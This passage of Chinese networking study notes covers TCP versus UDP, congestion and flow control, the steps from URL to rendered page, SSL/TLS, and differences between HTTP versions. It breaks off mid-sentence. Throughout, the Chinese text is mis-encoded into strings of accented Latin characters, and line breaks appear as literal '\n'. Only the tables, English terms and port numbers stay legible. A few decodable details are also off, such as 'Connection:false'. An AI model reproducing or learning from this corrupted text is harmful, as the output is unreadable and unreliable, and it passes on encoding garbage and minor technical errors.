é€’æ•°æ®ä¹‹å‰ï¼Œä¼šæœ‰ä¸‰æ¬¡æ¡æ‰‹æ¥å»ºç«‹è¿æ¥ï¼Œè€Œä¸”åœ¨æ•°æ®ä¼ é€’æ—¶ï¼Œæœ‰ç¡®è®¤ã€çª—å£ã€é‡ä¼ ã€æ‹¥å¡æ§åˆ¶æœºåˆ¶ã€‚é€šè¿‡ TCP è¿æ¥ä¼ è¾“çš„æ•°æ®ï¼Œæ— å·®é”™ã€ä¸ä¸¢å¤±ã€ä¸é‡å¤ã€å¹¶ä¸”æŒ‰åºåˆ°è¾¾ã€‚\n-   **ä¼ è¾“æ•ˆç‡** ï¼šç”±äº TCP è¿›è¡Œä¼ è¾“çš„æ—¶å€™å¤šäº†è¿æ¥ã€ç¡®è®¤ã€é‡ä¼ ç­‰æœºåˆ¶ï¼Œæ‰€ä»¥ TCP çš„ä¼ è¾“æ•ˆç‡è¦æ¯” UDP ä½å¾ˆå¤šã€‚\n-   **ä¼ è¾“å½¢å¼** ï¼š TCP æ˜¯é¢å‘å­—èŠ‚æµçš„ï¼ŒUDP æ˜¯é¢å‘æŠ¥æ–‡çš„ã€‚\n-   **é¦–éƒ¨å¼€é”€** ï¼šTCP é¦–éƒ¨å¼€é”€ï¼ˆ20 ï½ 60 å­—èŠ‚ï¼‰æ¯” UDP é¦–éƒ¨å¼€é”€ï¼ˆ8 å­—èŠ‚ï¼‰è¦å¤§ã€‚\n-   **æ˜¯å¦æä¾›å¹¿æ’­æˆ–å¤šæ’­æœåŠ¡** ï¼šTCP åªæ”¯æŒç‚¹å¯¹ç‚¹é€šä¿¡ï¼ŒUDP æ”¯æŒä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€ã€å¤šå¯¹å¤šï¼›\n\n| TCP          | UDP            |            |\n| ------------ | -------------- | ---------- |\n| æ˜¯å¦é¢å‘è¿æ¥ | æ˜¯             | å¦         |\n| æ˜¯å¦å¯é      | æ˜¯             | å¦         |\n| æ˜¯å¦æœ‰çŠ¶æ€   | æ˜¯             | å¦         |\n| ä¼ è¾“æ•ˆç‡     | è¾ƒæ…¢           | è¾ƒå¿«       |\n| ä¼ è¾“å½¢å¼     | å­—èŠ‚æµ         | æ•°æ®æŠ¥æ–‡æ®µ |\n| é¦–éƒ¨å¼€é”€     | 20 ï½ 60 bytes | 8 bytes    |\n| å¹¿æ’­æˆ–å¤šæ’­   | å¦             | æ˜¯         |\n\n### âºä½¿ç”¨ TCP çš„åè®®æœ‰å“ªäº›?\n\nåŸºäºTCPçš„åº”ç”¨å±‚åè®®æœ‰ï¼šHTTPã€ FTPã€ SMTPã€POP3/IMAPã€ TELNETã€SSH\n\n| åè®®      | åç§°             | é»˜è®¤ç«¯å£ | åŠŸèƒ½                                           |\n| --------- | ---------------- | -------- | ---------------------------------------------- |\n| HTTP      | è¶…æ–‡æœ¬ä¼ è¾“åè®®   | 80       | Web æµè§ˆå™¨ä¸ Web æœåŠ¡å™¨é€šä¿¡                    |\n| FTP       | æ–‡ä»¶ä¼ è¾“åè®®     | 20ã€21   | æä¾›æ–‡ä»¶ä¼ è¾“æœåŠ¡                               |\n| SMTP      | ç®€å•é‚®ä»¶ä¼ è¾“åè®® | 25       | ç”¨æ¥å‘é€ç”µå­é‚®ä»¶                               |\n| POP3/IMAP | é‚®ä»¶æ¥æ”¶åè®®     | 110/143  | è´Ÿè´£é‚®ä»¶æ¥æ”¶çš„åè®®                             |\n| TELNET    | è¿œç¨‹ç™»é™†åè®®     | 23       | è¿œç¨‹ç™»å½•ä¼šè¯ï¼Œè¢«SSHå–ä»£                        |\n| SSH       | å®‰å…¨å¤–å£³åè®®     | 22       | ä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®® |\n\n### â»ä½¿ç”¨ UDP çš„åè®®æœ‰å“ªäº›?\n\nåŸºäºUDPçš„åº”ç”¨å±‚åè®®ï¼šDHCPã€DNS\n\n- DHCPï¼šåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼Œç”¨æ¥åŠ¨æ€é…ç½® IP åœ°å€ï¼Œé»˜è®¤ç«¯å£68\n- DNSï¼šåŸŸåè§£æåè®®ï¼Œå°†åŸŸåè½¬æ¢ä¸º IP åœ°å€ï¼Œé»˜è®¤ç«¯å£53\n\n### â¼TCP å¦‚ä½•ä¿è¯ä¼ è¾“çš„å¯é æ€§ï¼Ÿ\n\n- é¦–å…ˆï¼ŒTCPçš„è¿æ¥æ˜¯åŸºäº**ä¸‰æ¬¡æ¡æ‰‹**ï¼Œè€Œæ–­å¼€åˆ™æ˜¯åŸºäº**å››æ¬¡æŒ¥æ‰‹**ã€‚ç¡®ä¿è¿æ¥å’Œæ–­å¼€çš„å¯é æ€§ã€‚\n- å…¶æ¬¡ï¼Œè¿˜ä½“ç°åœ¨**æœ‰çŠ¶æ€**ï¼›TCPä¼šè®°å½•å“ªäº›æ•°æ®å‘é€äº†ï¼Œå“ªäº›æ•°æ®è¢«æ¥æ”¶äº†ï¼Œå“ªäº›æ²¡æœ‰è¢«æ¥å—ï¼Œå¹¶ä¸”ä¿è¯æ•°æ®åŒ…æŒ‰åºåˆ°è¾¾ï¼Œä¿è¯æ•°æ®ä¼ è¾“ä¸å‡ºå·®é”™ã€‚\n- å†æ¬¡ï¼Œè¿˜ä½“ç°åœ¨**å¯æ§åˆ¶**ã€‚å®ƒæœ‰**æ•°æ®åŒ…æ ¡éªŒã€ACKåº”ç­”ã€è¶…æ—¶é‡ä¼ (å‘é€æ–¹)ã€å¤±åºæ•°æ®é‡ä¼ ï¼ˆæ¥æ”¶æ–¹ï¼‰ã€ä¸¢å¼ƒé‡å¤æ•°æ®ã€æµé‡æ§åˆ¶ï¼ˆæ»‘åŠ¨çª—å£ï¼‰å’Œæ‹¥å¡æ§åˆ¶ç­‰æœºåˆ¶**ã€‚\n\n**æµé‡æ§åˆ¶** : å½“æ¥æ”¶æ–¹æ¥ä¸åŠå¤„ç†å‘é€æ–¹çš„æ•°æ®ï¼Œèƒ½æç¤ºå‘é€æ–¹é™ä½å‘é€çš„é€Ÿç‡ï¼Œé˜²æ­¢åŒ…ä¸¢å¤±ã€‚TCP ä½¿ç”¨çš„æµé‡æ§åˆ¶åè®®æ˜¯å¯å˜å¤§å°çš„æ»‘åŠ¨çª—å£åè®®ï¼ˆTCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ï¼‰ã€‚\n\n**æ‹¥å¡æ§åˆ¶** : å½“ç½‘ç»œæ‹¥å¡æ—¶ï¼Œå‡å°‘æ•°æ®çš„å‘é€ã€‚\n\næ‹¥å¡æ§åˆ¶æ˜¯ä¸€ä¸ªå…¨å±€æ€§çš„è¿‡ç¨‹ï¼Œæ¶‰åŠåˆ°æ‰€æœ‰çš„ä¸»æœºï¼Œæ‰€æœ‰çš„è·¯ç”±å™¨ï¼Œä»¥åŠä¸é™ä½ç½‘ç»œä¼ è¾“æ€§èƒ½æœ‰å…³çš„æ‰€æœ‰å› ç´ ã€‚\n\næµé‡æ§åˆ¶å¾€å¾€æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡é‡çš„æ§åˆ¶ï¼Œæ˜¯ä¸ªç«¯åˆ°ç«¯çš„é—®é¢˜ã€‚æŠ‘åˆ¶å‘é€ç«¯å‘é€æ•°æ®çš„é€Ÿç‡ï¼Œä»¥ä¾¿æ¥æ”¶ç«¯æ¥å¾—åŠæ¥æ”¶ã€‚\n\n### â½TCP å¦‚ä½•å®ç°æµé‡æ§åˆ¶ï¼Ÿ\n\n**TCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ã€‚æµé‡æ§åˆ¶æ˜¯ä¸ºäº†æ§åˆ¶å‘é€æ–¹å‘é€é€Ÿç‡ï¼Œä¿è¯æ¥æ”¶æ–¹æ¥å¾—åŠæ¥æ”¶ã€‚** æ¥æ”¶æ–¹å‘é€çš„ç¡®è®¤æŠ¥æ–‡ä¸­çš„çª—å£å­—æ®µå¯ä»¥ç”¨æ¥æ§åˆ¶å‘é€æ–¹çª—å£å¤§å°ï¼Œä»è€Œå½±å“å‘é€æ–¹çš„å‘é€é€Ÿç‡ã€‚å°†çª—å£å­—æ®µè®¾ç½®ä¸º 0ï¼Œåˆ™å‘é€æ–¹ä¸èƒ½å‘é€æ•°æ®ã€‚\n\n### â¾TCP çš„æ‹¥å¡æ§åˆ¶æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿ\n\næ‹¥å¡ï¼šåœ¨æŸæ®µæ—¶é—´ï¼Œè‹¥å¯¹ç½‘ç»œä¸­æŸä¸€èµ„æºçš„éœ€æ±‚è¶…è¿‡äº†è¯¥èµ„æºæ‰€èƒ½æä¾›çš„å¯ç”¨éƒ¨åˆ†ï¼Œç½‘ç»œçš„æ€§èƒ½å°±è¦å˜åã€‚\n\nä¸ºäº†è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼ŒTCP å‘é€æ–¹è¦ç»´æŒä¸€ä¸ª **æ‹¥å¡çª—å£(cwnd)** çš„çŠ¶æ€å˜é‡ã€‚æ‹¥å¡æ§åˆ¶çª—å£çš„å¤§å°å–å†³äºç½‘ç»œçš„æ‹¥å¡ç¨‹åº¦ï¼Œå¹¶ä¸”åŠ¨æ€å˜åŒ–ã€‚å‘é€æ–¹è®©è‡ªå·±çš„å‘é€çª—å£å–ä¸ºæ‹¥å¡çª—å£å’Œæ¥æ”¶æ–¹çš„æ¥å—çª—å£ä¸­è¾ƒå°çš„ä¸€ä¸ªã€‚\n\nTCP çš„æ‹¥å¡æ§åˆ¶é‡‡ç”¨äº†å››ç§ç®—æ³•ï¼Œå³ **æ…¢å¼€å§‹** ã€ **æ‹¥å¡é¿å…** ã€**å¿«é‡ä¼ ** å’Œ **å¿«æ¢å¤**ã€‚åœ¨ç½‘ç»œå±‚ä¹Ÿå¯ä»¥ä½¿è·¯ç”±å™¨é‡‡ç”¨é€‚å½“çš„åˆ†ç»„ä¸¢å¼ƒç­–ç•¥ï¼ˆå¦‚ä¸»åŠ¨é˜Ÿåˆ—ç®¡ç† AQMï¼‰ï¼Œä»¥å‡å°‘ç½‘ç»œæ‹¥å¡çš„å‘ç”Ÿã€‚\n\n- **æ…¢å¼€å§‹ï¼š** æ…¢å¼€å§‹ç®—æ³•çš„æ€è·¯æ˜¯å½“ä¸»æœºå¼€å§‹å‘é€æ•°æ®æ—¶ï¼Œå¦‚æœç«‹å³æŠŠå¤§é‡æ•°æ®å­—èŠ‚æ³¨å…¥åˆ°ç½‘ç»œï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå¼•èµ·ç½‘ç»œé˜»å¡ï¼Œå› ä¸ºç°åœ¨è¿˜ä¸çŸ¥é“ç½‘ç»œçš„ç¬¦åˆæƒ…å†µã€‚ç»éªŒè¡¨æ˜ï¼Œè¾ƒå¥½çš„æ–¹æ³•æ˜¯å…ˆæ¢æµ‹ä¸€ä¸‹ï¼Œå³ç”±å°åˆ°å¤§é€æ¸å¢å¤§å‘é€çª—å£ï¼Œä¹Ÿå°±æ˜¯ç”±å°åˆ°å¤§é€æ¸å¢å¤§æ‹¥å¡çª—å£æ•°å€¼ã€‚cwnd åˆå§‹å€¼ä¸º 1ï¼Œæ¯ç»è¿‡ä¸€ä¸ªä¼ æ’­è½®æ¬¡ï¼Œcwnd åŠ å€ã€‚\n- **æ‹¥å¡é¿å…ï¼š** æ‹¥å¡é¿å…ç®—æ³•çš„æ€è·¯æ˜¯è®©æ‹¥å¡çª—å£ cwnd ç¼“æ…¢å¢å¤§ï¼Œå³æ¯ç»è¿‡ä¸€ä¸ªå¾€è¿”æ—¶é—´ RTT å°±æŠŠå‘é€æ”¾çš„ cwnd åŠ  1.\n- **å¿«é‡ä¼ ï¼š**æœ‰æ—¶ä¸ªåˆ«æŠ¥æ–‡æ®µä¼šåœ¨ç½‘ç»œä¸­ä¸¢å¤±ï¼Œä½†å®é™…ä¸Šç½‘ç»œå¹¶æœªå‘ç”Ÿæ‹¥å¡ã€‚å¦‚æœå‘é€æ–¹è¿Ÿè¿Ÿæ”¶ä¸åˆ°ç¡®è®¤ï¼Œå°±ä¼šäº§ç”Ÿè¶…æ—¶ï¼Œå°±ä¼šè¯¯è®¤ä¸ºç½‘ç»œå‘ç”Ÿäº†æ‹¥å¡ã€‚è¿™å°±å¯¼è‡´å‘é€æ–¹é”™è¯¯åœ°å¯åŠ¨æ…¢å¼€å§‹ï¼ŒæŠŠæ‹¥å¡çª—å£cwndåˆè®¾ç½®ä¸º1ï¼Œå› è€Œ\n  é™ä½äº†ä¼ è¾“æ•ˆç‡ã€‚å¿«é‡ä¼ ç®—æ³•å¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚å¿«é‡ä¼ ç®—æ³•é¦–å…ˆè¦æ±‚æ¥æ”¶æ–¹æ¯æ”¶åˆ°ä¸€ä¸ªå¤±åºçš„æŠ¥æ–‡æ®µåå°±ç«‹å³å‘å‡ºé‡å¤ç¡®è®¤ï¼Œä½¿å‘é€æ–¹åŠæ—©çŸ¥é“æœ‰æŠ¥æ–‡æ®µæ²¡æœ‰åˆ°è¾¾å¯¹æ–¹ã€‚å‘é€æ–¹åªè¦ä¸€è¿æ”¶åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤å°±åº”å½“ç«‹å³é‡ä¼ å¯¹æ–¹å°šæœªæ”¶åˆ°çš„æŠ¥æ–‡æ®µï¼Œè€Œä¸å¿…ç»§ç»­ç­‰å¾…é‡ä¼ è®¡æ—¶å™¨åˆ°æœŸã€‚ç”±äºå‘é€æ–¹å°½æ—©é‡ä¼ æœªè¢«ç¡®è®¤çš„æŠ¥æ–‡æ®µï¼Œå› æ­¤é‡‡ç”¨å¿«é‡ä¼ åå¯ä»¥ä½¿æ•´ä¸ªç½‘ç»œååé‡æé«˜çº¦20%ã€‚\n- **å¿«æ¢å¤ï¼š** å½“å‘é€æ–¹è¿ç»­æ”¶åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤ï¼Œå°±ä¼šæŠŠæ…¢å¼€å§‹é—¨é™ssthreshå‡åŠï¼Œæ¥ç€æŠŠcwndå€¼è®¾ç½®ä¸ºæ…¢å¼€å§‹é—¨é™\n  ssthreshå‡åŠåçš„æ•°å€¼ï¼Œç„¶åå¼€å§‹æ‰§è¡Œæ‹¥å¡é¿å…ç®—æ³•ï¼Œä½¿æ‹¥å¡çª—å£ç¼“æ…¢åœ°çº¿æ€§å¢å¤§ã€‚åœ¨é‡‡ç”¨å¿«æ¢å¤ç®—æ³•æ—¶ï¼Œæ…¢å¼€å§‹ç®—æ³•åªæ˜¯åœ¨TCPè¿æ¥å»ºç«‹æ—¶å’Œç½‘ç»œå‡ºç°è¶…æ—¶æ—¶æ‰ä½¿ç”¨ã€‚é‡‡ç”¨è¿™æ ·çš„æ‹¥å¡æ§åˆ¶æ–¹æ³•ä½¿å¾—TCPçš„æ€§èƒ½æœ‰æ˜æ˜¾çš„æ”¹è¿›ã€‚\n\n## â‘¢HTTP\n\n### â¶ä»è¾“å…¥URL åˆ°é¡µé¢å±•ç¤ºçš„è¿‡ç¨‹\n\n1. **DNS è§£æ**\n\nå› ä¸ºæµè§ˆå™¨ä¸èƒ½ç›´æ¥é€šè¿‡åŸŸåæ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å™¨ IP åœ°å€ï¼Œæ‰€ä»¥éœ€è¿›è¡Œ DNS è§£æï¼ŒæŸ¥æ‰¾åˆ°å¯¹åº”çš„ IP åœ°å€è¿›è¡Œè®¿é—®ã€‚\n\n2. **TCP è¿æ¥**\n\nå½“æµè§ˆå™¨è·å–åˆ°æœåŠ¡å™¨çš„ IP åœ°å€åï¼Œæµè§ˆå™¨ä¼šç”¨ä¸€ä¸ªéšæœºçš„ç«¯å£ï¼ˆ1024 < ç«¯å£ < 65535ï¼‰å‘æœåŠ¡å™¨ 80 ç«¯å£å‘èµ· TCP è¿æ¥è¯·æ±‚ï¼ˆæ³¨ï¼šHTTP é»˜è®¤çº¦å®š 80 ç«¯å£ï¼ŒHTTPS ä¸º 443 ç«¯å£ï¼‰ã€‚è¿™ä¸ªè¿æ¥è¯·æ±‚åˆ°è¾¾æœåŠ¡ç«¯åï¼Œé€šè¿‡ TCP ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹ TCP çš„è¿æ¥ã€‚\n\n3. **å‘é€ HTTP / HTTPS è¯·æ±‚ï¼ˆå»ºç«‹ TLS è¿æ¥ï¼‰**\n\nå»ºç«‹è¿æ¥åå°±å¯ä»¥é€šè¿‡ HTTP è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚å¦‚æœä½¿ç”¨ HTTPSï¼Œä¼šåœ¨ TCP ä¸ HTTP ä¹‹é—´å¤šæ·»åŠ ä¸€å±‚åè®®åšåŠ å¯†åŠè®¤è¯çš„æœåŠ¡ã€‚HTTPS ä½¿ç”¨ SSLï¼ˆSecure Socket Layerï¼‰ å’Œ TLSï¼ˆTransport Layer Securityï¼‰ åè®®ï¼Œä¿éšœäº†ä¿¡æ¯çš„å®‰å…¨ã€‚\n\n4. **æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å› HTTP æŠ¥æ–‡**\n\næœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œå°†å‘å›ä¸€ä¸ª HTTP å“åº”æŠ¥æ–‡ï¼Œå†…å®¹åŒ…æ‹¬ç›¸å…³å“åº”å¤´å’Œ HTML æ­£æ–‡ã€‚\n\n5. **æµè§ˆå™¨è§£ææ¸²æŸ“é¡µé¢**\n\næµè§ˆå™¨åœ¨æ”¶åˆ°HTML,CSS,JSæ–‡ä»¶åï¼Œæ¸²æŸ“é¡µé¢å‘ˆç°åˆ°å±å¹•ä¸Š\n\n6. **HTTP è¯·æ±‚ç»“æŸï¼Œæ–­å¼€ TCP è¿æ¥**\n\nç°åœ¨çš„é¡µé¢ä¸ºäº†ä¼˜åŒ–è¯·æ±‚çš„è€—æ—¶ï¼Œé»˜è®¤éƒ½ä¼šå¼€å¯æŒä¹…è¿æ¥ï¼ˆkeep-aliveï¼‰ï¼Œé‚£ä¹ˆä¸€ä¸ª TCP è¿æ¥ç¡®åˆ‡å…³é—­çš„æ—¶æœºï¼Œæ˜¯è¿™ä¸ª tab æ ‡ç­¾é¡µå…³é—­çš„æ—¶å€™ã€‚è¿™ä¸ªå…³é—­çš„è¿‡ç¨‹å°±æ˜¯**å››æ¬¡æŒ¥æ‰‹**ã€‚\n\nå‚è€ƒï¼š[æµè§ˆå™¨ä»è¾“å…¥ç½‘å€åˆ°é¡µé¢å±•ç¤ºçš„è¿‡ç¨‹](https://cloud.tencent.com/developer/article/1879758)\n\n### â·SSL/TLS\n\nSSL/TLSæ˜¯ä¸€ç§å¯†ç é€šä¿¡æ¡†æ¶ï¼Œä»–æ˜¯ä¸–ç•Œä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„å¯†ç é€šä¿¡æ–¹æ³•ã€‚SSL/TLSç»¼åˆè¿ç”¨äº†å¯†ç å­¦ä¸­çš„å¯¹ç§°å¯†ç ï¼Œæ¶ˆæ¯è®¤è¯ç ï¼Œå…¬é’¥å¯†ç ï¼Œæ•°å­—ç­¾åï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨ç­‰ã€‚\n\nSSL(Secure Socket Layer)å®‰å…¨å¥—æ¥å±‚ï¼Œæ˜¯1994å¹´ç”±Netscapeå…¬å¸è®¾è®¡çš„ä¸€å¥—åè®®ï¼Œå¹¶ä¸1995å¹´å‘å¸ƒäº†3.0ç‰ˆæœ¬ã€‚\n\nTLS(Transport Layer Security)ä¼ è¾“å±‚å®‰å…¨æ˜¯IETFåœ¨SSL3.0åŸºç¡€ä¸Šè®¾è®¡çš„åè®®ï¼Œç›¸å½“äºSSLçš„åç»­ç‰ˆæœ¬ã€‚\n\n![](https://img.jwt1399.top/img/202210271131168.webp)\n\nTLSä¸»è¦åˆ†ä¸ºä¸¤å±‚ï¼Œ\n\n- åº•å±‚æ˜¯**TLSè®°å½•åè®®**ï¼Œè´Ÿè´£æ¶ˆæ¯çš„å‹ç¼©ï¼ŒåŠ å¯†åŠè®¤è¯\n\n- ä¸Šå±‚æ˜¯**TLSæ¡æ‰‹åè®®**ï¼Œä¸»è¦åˆ†ä¸ºæ¡æ‰‹åè®®ï¼Œå¯†ç è§„æ ¼å˜æ›´åè®®å’Œåº”ç”¨æ•°æ®åè®®4ä¸ªéƒ¨åˆ†ã€‚\n\n  - 1.**æ¡æ‰‹åè®®ï¼š**è´Ÿè´£åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å•†å®šå¯†ç ç®—æ³•å’Œå…±äº«å¯†é’¥ï¼ŒåŒ…æ‹¬è¯ä¹¦è®¤è¯\n\n  - 2.**å¯†ç è§„æ ¼å˜æ›´åè®®ï¼š**è´Ÿè´£å‘é€šä¿¡å¯¹è±¡ä¼ è¾¾å˜æ›´å¯†ç æ–¹å¼çš„ä¿¡å·\n\n  - 3.**è­¦å‘Šåè®®ï¼š**è´Ÿè´£åœ¨å‘ç”Ÿé”™è¯¯çš„æ—¶å€™å°†é”™è¯¯ä¼ è¾¾ç»™å¯¹æ–¹\n\n  - 4.**åº”ç”¨æ•°æ®åè®®ï¼š**è´Ÿè´£å°†TLSæ‰¿è½½çš„åº”ç”¨æ•°æ®ä¼ è¾¾ç»™é€šä¿¡å¯¹è±¡çš„åè®®ã€‚\n\n### â¸HTTP å’Œ HTTPS æœ‰ä»€ä¹ˆåŒºåˆ«\n\n- **ç«¯å£å·** ï¼šHTTP é»˜è®¤æ˜¯ 80ï¼ŒHTTPS é»˜è®¤æ˜¯ 443ã€‚\n- **URL å‰ç¼€** ï¼šHTTP çš„ URL å‰ç¼€æ˜¯ `http://`ï¼ŒHTTPS çš„ URL å‰ç¼€æ˜¯ `https://`ã€‚\n- **å®‰å…¨æ€§å’Œèµ„æºæ¶ˆè€—** ï¼šHTTP å®‰å…¨æ€§æ²¡æœ‰ HTTPS é«˜ï¼Œä½† HTTPS æ¯” HTTP è€—è´¹æ›´å¤šæœåŠ¡å™¨èµ„æºä¸”å“åº”é€Ÿåº¦æ›´æ…¢ã€‚ \n  - **HTTP åè®®è¿è¡Œåœ¨ TCP ä¹‹ä¸Š**ï¼Œæ‰€æœ‰ä¼ è¾“çš„å†…å®¹éƒ½æ˜¯æ˜æ–‡ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½æ— æ³•éªŒè¯å¯¹æ–¹çš„èº«ä»½ã€‚\n  - **HTTP åè®®è¿è¡Œåœ¨ SSL ä¹‹ä¸Š**ï¼ŒSSL/TLS è¿è¡Œåœ¨ TCP ä¹‹ä¸Šï¼ŒHTTPS = (SSL/TLS + HTTP)ï¼ŒSSL/TLSä¾é è¯ä¹¦æ¥éªŒè¯æœåŠ¡å™¨çš„èº«ä»½ï¼Œå¹¶ä¸ºæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åŠ å¯†ã€‚åŠ å¯†é‡‡ç”¨å¯¹ç§°åŠ å¯†ï¼Œä½†å¯¹ç§°åŠ å¯†çš„å¯†é’¥ç”¨æœåŠ¡å™¨æ–¹çš„è¯ä¹¦è¿›è¡Œéå¯¹ç§°åŠ å¯†ã€‚\n  - HTTP ä½¿ç”¨ TCP ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éœ€è¦äº¤æ¢ 3 ä¸ªåŒ…ã€‚\n  - HTTPSé™¤äº† TCP çš„ä¸‰ä¸ªåŒ…ï¼Œè¿˜è¦åŠ ä¸Š SSL æ¡æ‰‹éœ€è¦çš„ 9 ä¸ªåŒ…ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯ 12 ä¸ªåŒ…ã€‚\n\n### âHTTP 1.0 ã€1.1ã€ 2.0ã€3.0åŒºåˆ«\n\n#### â“µHTTP 1.0â€”â€”1996\n\n> 1.0çš„HTTPç‰ˆæœ¬ï¼Œæ˜¯ä¸€ç§æ— çŠ¶æ€ï¼Œæ— è¿æ¥çš„åº”ç”¨å±‚åè®®ã€‚\n\n`ç‰¹ç‚¹ï¼š`\n\n- **çŸ­è¿æ¥ï¼š**HTTP1.0è§„å®šæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¿æŒçŸ­æš‚çš„é“¾æ¥\n\n- **æ— è¿æ¥ï¼š**æµè§ˆå™¨æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦ä¸æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼ŒæœåŠ¡å™¨å¤„ç†å®Œæˆä»¥åç«‹å³æ–­å¼€TCPè¿æ¥\n- **æ— çŠ¶æ€ï¼š**æœåŠ¡å™¨ä¸è·Ÿè¸ªæ¯ä¸ªå®¢æˆ·ï¼Œä¹Ÿä¸è®°å½•è¿‡å»çš„è¯·æ±‚ï¼Œå€ŸåŠ©**cookie/session**æœºåˆ¶æ¥åšèº«ä»½è®¤è¯å’ŒçŠ¶æ€è®°å½•ã€‚\n  \n- **æ— æ³•å¤ç”¨è¿æ¥**ï¼šæ¯æ¬¡å‘é€è¯·æ±‚ï¼Œéƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡TCPè¿æ¥ï¼Œè€ŒTCPçš„è¿æ¥é‡Šæ”¾è¿‡ç¨‹åˆæ˜¯æ¯”è¾ƒè´¹äº‹çš„ã€‚è¿™ç§æ— è¿æ¥çš„ç‰¹æ€§ä¼šä½¿å¾—ç½‘ç»œçš„åˆ©ç”¨ç‡å˜ä½ã€‚\n\n- **é˜Ÿå¤´é˜»å¡**ï¼šHTTP1.0è§„å®šä¸‹ä¸€ä¸ªè¯·æ±‚å¿…é¡»åœ¨å‰ä¸€ä¸ªè¯·æ±‚å“åº”åˆ°è¾¾ä¹‹åæ‰èƒ½å‘é€ï¼Œå‡è®¾å‰ä¸€ä¸ªè¯·æ±‚å“åº”ä¸€ç›´ä¸åˆ°è¾¾ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªè¯·æ±‚å°±ä¸å‘é€ï¼Œåé¢çš„è¯·æ±‚å°±é˜»å¡äº†ã€‚\n\n- **ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ **ï¼šä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡éƒ½ä¼šä¼ é€å…¨éƒ¨çš„é¡µé¢å’Œæ•°æ®ã€‚\n\n#### â“¶HTTP 1.1â€”â€”1999\n\n> HTTP1.1ç»§æ‰¿äº†HTTP1.0ï¼Œå…‹æœäº†HTTP1.0æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚\n\n- **é•¿è¿æ¥**ï¼šHTTP1.1å¢åŠ `Connection`å­—æ®µï¼Œé€šè¿‡è®¾ç½®`Keep-Alive`ä¿æŒHTTPè¿æ¥ä¸æ–­ã€‚é¿å…æ¯æ¬¡å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¯·æ±‚éƒ½è¦é‡å¤å»ºç«‹é‡Šæ”¾å»ºç«‹TCPè¿æ¥ã€‚æé«˜äº†ç½‘ç»œçš„åˆ©ç”¨ç‡ã€‚å¦‚æœå®¢æˆ·ç«¯æƒ³å…³é—­HTTPè¿æ¥ï¼Œå¯ä»¥åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦`Connection:false`æ¥å‘ŠçŸ¥æœåŠ¡å™¨å…³é—­è¯·æ±‚ã€‚\n- **æ”¯æŒæ–­ç‚¹ç»­ä¼ **ï¼šé€šè¿‡ä½¿ç”¨è¯·æ±‚å¤´ä¸­çš„ `Range` æ¥å®ç°ã€‚å®ƒå…è®¸åªè¯·æ±‚èµ„æºçš„æŸä¸ªéƒ¨åˆ†ï¼Œå³è¿”å›ç æ˜¯ 206ï¼ˆPartial Contentï¼‰ï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†å¼€å‘è€…è‡ªç”±çš„é€‰æ‹©ä»¥ä¾¿äºå……åˆ†åˆ©ç”¨å¸¦å®½å’Œè¿æ¥ã€‚\n\n- **å¢åŠ Hostå­—æ®µ** : HTTP/1.1åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥äº†`Host`å­—æ®µã€‚æ²¡æœ‰Hostå¤´åŸŸä¼šæŠ¥å‘Šä¸€ä¸ªé”™è¯¯ï¼ˆ400 Bad Requestï¼‰\n- **ç¼“å­˜å¤„ç†** : åœ¨ HTTP1.0 ä¸­ä¸»è¦ä½¿ç”¨ `Header` é‡Œçš„` If-Modified-Since,Expires` æ¥åšä¸ºç¼“å­˜åˆ¤æ–­çš„æ ‡å‡†ï¼ŒHTTP1.1 åˆ™å¼•å…¥äº†æ›´å¤šçš„ç¼“å­˜æ§åˆ¶ç­–ç•¥ä¾‹å¦‚ `Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Match` ç­‰æ›´å¤šå¯ä¾›é€‰æ‹©çš„ç¼“å­˜å¤´æ¥æ§åˆ¶ç¼“å­˜ç­–ç•¥ã€‚\n- **å¯ä»¥ä½¿ç”¨ç®¡é“ä¼ è¾“**ï¼šå¤šä¸ªè¯·æ±‚å¯ä»¥åŒæ—¶å‘é€ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿˜æ˜¯æŒ‰ç…§é¡ºåºï¼Œå…ˆå›åº” A è¯·æ±‚ï¼Œå®Œæˆåå†å›åº” B 